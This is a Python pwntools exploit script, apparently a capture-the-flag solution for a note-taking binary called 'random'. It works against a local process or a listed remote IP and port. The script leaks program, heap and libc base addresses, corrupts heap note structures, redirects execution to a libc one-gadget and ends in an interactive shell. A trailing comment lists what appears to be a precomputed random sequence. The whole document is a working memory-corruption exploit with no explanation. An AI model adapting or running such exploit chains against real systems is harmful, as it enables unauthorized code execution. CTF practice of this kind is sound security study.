from pwn import *
import sys
context.arch = 'amd64'
stat = sys.argv[1]
cnt = 10

if(stat == 'l'):
	io = process("./random")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
elif(stat == 'd'):
	io = process("./random",env = {"LD_PRELOAD":"./libc-2.23.so"})
	libc = ELF("./libc-2.23.so")
elif(stat == 'r'):
	io = remote("119.3.203.228",31788)
	libc = ELF("./libc-2.23.so")

s       = lambda data               :io.send(str(data)) 
sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
sl      = lambda data               :io.sendline(str(data))
sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
irt     = lambda                    :io.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))

ru("name:\n")
s("aaaaaaaa")
ru("game, aaaaaaaa")
proc_base = u64(r(6).ljust(8,'\x00'))-0xb90
info("PROC BASE -> %#x"%proc_base)
sla("?\n","35")

def add(size,data,ch):
	sla("(Y/N)\n","Y")
	sla("size of the note:\n",str(size))
	sla("content of the note:\n",data)
	sla("(Y/N)\n",ch)
def see(index):
	sla("(Y/N)\n","Y")
	sla("index of the note:\n",str(index))
	return r(6)
def chg(index,data):
	sla("(Y/N)\n","Y")
	sla("index of the note:\n",str(index))
	sla("content of the note:\n",data)

sla("(0~10)\n","10")
sla("(Y/N)\n","N");sla("(Y/N)\n","N");
add(0x3f,'0000',"Y")
for i in range(7):
	sla("(Y/N)\n","N")

sla("(0~10)\n","10")
add(0x3f,'1111',"Y")
add(0x17,'2222',"Y")
for i in range(3):
	sla("(Y/N)\n","N")
heap_base = uu64(see(2))-0xb0
info("HEAP BASE -> %#x"%heap_base)
for i in range(4+2):
	sla("(Y/N)\n","N")

sla("(0~10)\n","10")
for i in range(6):
	sla("(Y/N)\n","N")
chg(2,p64(heap_base+0x1b0)+p64(proc_base+0x1427)+p32(2))
for i in range(3+2):
	sla("(Y/N)\n","N")
# 0x1b0:(free)add -> 0x190:(free)see -> 0x1b0:(free)chg
chg(0,p64(heap_base+0x1b0)+p64(proc_base+0x1600)+p64(0x2)+p64(0x91)+p64(heap_base+0x190)+p64(proc_base+0x129e)+p32(2))
add(0x3f,p64(heap_base+0x240)+p64(proc_base+0x1427)+p32(2),"N")
libc_base = uu64(see(2))-(libc.sym['__malloc_hook']+0x10+88)
info("LIBC BASE -> %#x"%libc_base)
chg(1,p64(0)+p64(libc_base+0x45216)+p32(2))
io.interactive()
'''
[3,2,1,3,1,3,2,0,1,1
,2,3,2,3,3,2,0,2,0,0
,3,0,3,1,2,2,2,3,3,3
,1,2,2,2,1,3,1,0,3,2
,1,1,1,3,0,1,2,0,3,2
,1,2,3,0,0,1,2,2,0,1
,1,1,0,3,0,1,2,1,1,1
,0,3,2,1,2,3,2,0,3,2,
3,0,0,2,0,0,3,3,2,3,0,0,0,0,3,0,
2,2,2,3,3,2,2,2,3,1,1,2,1,0,0,0,
1,0,2,1,1,1,0,3,0,1,3,1,1,3,1,3,
1,3,3,0,1,1,2,1,2,3,3,0,0,3,0,1,
3,3,2,0,0,3,0,1,0,3,2,1,2,3,1,3,
3,0,0,0,1,2,1,0,2,0,0,2,3,0,3,3,
3,1,3,0,0,3,1,0,3,3,2,1,2,3,1,1,
3,1,2,0,3,3,0,1,0,0,3,3,1,2,2,0,
0,2,0,0,1,1,1,0,0,3,2,3,2,3,0,1,
0,2,1,3,2,2,1,2,2,0,1,3,3,0,0,3,
2,0,3,3,2,0,0,2,3,2,1,1,1,2,2,1]
'''

